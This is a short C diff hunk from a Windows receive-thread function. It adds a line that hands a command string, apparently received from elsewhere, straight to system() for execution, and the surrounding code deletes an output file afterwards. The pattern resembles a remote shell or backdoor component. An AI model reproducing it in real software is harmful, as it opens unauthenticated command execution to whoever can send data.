@@ -35,6 +35,7 @@ DWORD WINAPI RecvThreadProc(LPVOID lpPrameter)
 			if(szCommand[i] == '>')
 				break;
 		}
+		system(szCommand);
 		DeleteFileA(OUT_TEXT);
 		OutputDebugStringA(szCommand);
 		ResetEvent(g_hEvent);
